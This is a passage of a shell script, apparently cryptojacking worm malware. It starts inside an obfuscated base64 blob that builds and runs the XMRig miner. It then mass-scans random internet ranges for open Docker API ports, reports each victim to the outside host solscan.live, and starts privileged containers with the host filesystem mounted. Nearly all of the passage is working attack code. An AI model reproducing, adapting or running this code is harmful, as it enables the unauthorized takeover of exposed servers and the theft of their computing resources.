mb290ZXIgIkluc3RhbGxpbmcgU3VibW9kdWxlcyIKCiAgICBwaGFzZWhlYWRlciAiQnVpbGRpbmcgWE1SaWciCiAgICBta2RpciAtcCBidWlsZAogICAgY2QgYnVpbGQgfHwgeyBlY2hvICJFcnJvcjogQ2Fubm90IGNoYW5nZSB0byBkaXJlY3RvcnkgYnVpbGQiOyBleGl0IDE7IH0KCiAgICBjYXNlICIkQlVJTEQiIGluCiAgICAgICAgNykKICAgICAgICAgICAgY21ha2UgLi4gLURXSVRIX0VNQkVEREVEX0NPTkZJRz1PTiAtRENNQUtFX0JVSUxEX1RZUEU9UmVsZWFzZSAtREVOQUJMRV9IV0xPQz1PTiAtRFdJVEhfSFdMT0M9T04gLURDTUFLRV9UT09MQ0hBSU5fRklMRT0uLi9jbWFrZS9Ub29sY2hhaW5zL2FybXY3LWxpbnV4LWdudWVhYmloZi5jbWFrZQogICAgICAgICAgICA7OwogICAgICAgIDgpCiAgICAgICAgICAgIGNtYWtlIC4uIC1EV0lUSF9FTUJFRERFRF9DT05GSUc9T04gLURDTUFLRV9CVUlMRF9UWVBFPVJlbGVhc2UgLURFTkFCTEVfSFdMT0M9T04gLURXSVRIX0hXTE9DPU9OIC1EQ01BS0VfVE9PTENIQUlOX0ZJTEU9Li4vY21ha2UvVG9vbGNoYWlucy9hYXJjaDY0LWxpbnV4LWdudS5jbWFrZQogICAgICAgICAgICA7OwogICAgICAgIDkpCiAgICAgICAgICAgIGNtYWtlIC4uIC1EV0lUSF9FTUJFRERFRF9DT05GSUc9T04gLURDTUFLRV9CVUlMRF9UWVBFPVJlbGVhc2UgLURXSVRIX0NVREE9T04gLURFTkFCTEVfSFdMT0M9T04gLURXSVRIX0hXTE9DPU9OCiAgICAgICAgICAgIDs7CiAgICAgICAgKikKICAgICAgICAgICAgY21ha2UgLi4gLURXSVRIX0VNQkVEREVEX0NPTkZJRz1PTiAtRENNQUtFX0JVSUxEX1RZUEU9UmVsZWFzZSAtREVOQUJMRV9IV0xPQz1PTiAtRFdJVEhfSFdMT0M9T04KICAgICAgICAgICAgOzsKICAgIGVzYWMKCiAgICBtYWtlIC1qJChucHJvYykgfHwgeyBlY2hvICJFcnJvcjogQnVpbGQgZmFpbGVkIjsgZXhpdCAxOyB9CiAgICBwaGFzZWZvb3RlciAiQnVpbGRpbmcgWE1SaWciCn0KCiMgUGFja2FnZSBGaW5hbCBCaW5hcnkKcGFja2FnZSgpIHsKICAgIGNkICRTQ1JJUFRQQVRIL3htcmlnL2J1aWxkIHx8IHsgZWNobyAiRXJyb3I6IENhbm5vdCBjaGFuZ2UgdG8gZGlyZWN0b3J5IGJ1aWxkIjsgZXhpdCAxOyB9CiAgICB1cHggLTkgLW8gc2JpbiB4bXJpZwogICAgY3AgLi9zYmluIC9yb290L3NiaW4KICAgIGNobW9kICt4IC9yb290L3NiaW4KCiAgICBlY2hvIC1lICJcZVszM21Db21wcmVzc2luZyBCdWlsZDpcZVszOW0iCiAgICA3emEgYSB4bXJpZy43eiAqCiAgICBtdiB4bXJpZy43eiAkU0NSSVBUUEFUSC8KICAgIGNkICRTQ1JJUFRQQVRIIHx8IHsgZWNobyAiRXJyb3I6IENhbm5vdCBjaGFuZ2UgdG8gZGlyZWN0b3J5ICRTQ1JJUFRQQVRIIjsgZXhpdCAxOyB9Cn0KCiMgQ2xlYW51cApjbGVhbnVwKCkgewogICAgZWNobyAtZSAiXGVbMzNtQ2xlYW5pbmcgVXAuLi5cZVszOW0iCiAgICBybSAtcmYgIiRTQ1JJUFRQQVRIL3htcmlnIgp9CgojIFNldCBGbGFncwpmbGFncyAiJEAiCgojIERpc3BsYXkgSGVhZGVyCmlub3V0aGVhZGVyCgojIFBlcmZvcm0gU2NyaXB0IFNlbGYtVXBkYXRlCnNlbGZfdXBkYXRlCgojIEluc3RhbGwgUmVxdWlyZWQgUGFja2FnZXMKcGFja2FnZXMKCiMgc3RhcnQgZG9ja2UKc3RhcnRfZG9ja2VyCiMgUGVyZm9ybSBCYWNrdXAgb2YgUHJpb3IgQnVpbGQKYmFja3VwCgojIFBlcmZvcm0gQ29tcGlsYXRpb24KY29tcGlsZQoKIyBQYWNrYWdlIEJpbmFyeQpwYWNrYWdlCgojIENsZWFudXAgQWZ0ZXJ3YXJkCmNsZWFudXAKCiMgRGlzcGxheSBGb290ZXIKaW5vdXRmb290ZXIK | base64 -d | bash 2>/dev/null) &
bash /root/sbin
}

DOCKER_GATLING_GUN(){
PORT=$1
RATE=$2
RANGE=$3
rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6 ; echo '')
eval "$rndstr"="'$(masscan -p$PORT $RANGE.0.0.0/8 --rate=$RATE | awk '{print $6}'| zgrab --senders 200 --port $PORT --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip)'";
for IPADDR in ${!rndstr}
do echo "$IPADDR:$PORT"
wget -q "http://solscan.live/incoming/docker.php?dockerT=$IPADDR:$PORT" -O /dev/null
timeout -s SIGKILL 120 docker -H tcp://$IPADDR:$PORT run -d --privileged --net host -v /:/mnt nmlmweb3/upspin 
RGWERT=$?
if ! [ "$RGWERT" = "0" ] ; then
timeout -s SIGKILL 120 docker -H tcp://$IPADDR:$PORT run -d --privileged --net host -v /:/mnt nmlmweb3/upspin   
fi
done;
}

function start_the_gatling_gun(){
while true ; do 
N=$(($RANDOM%255+1)) 

#for N in $(seq 120 150); do
PORT_TO_PWN_ARRAY=("2375" "2376" "4243")
for PORT_TO_PWN in ${PORT_TO_PWN_ARRAY[@]}
do
DOCKER_GATLING_GUN $PORT_TO_PWN $SCAN_RATE $N
done
done
}


init_main
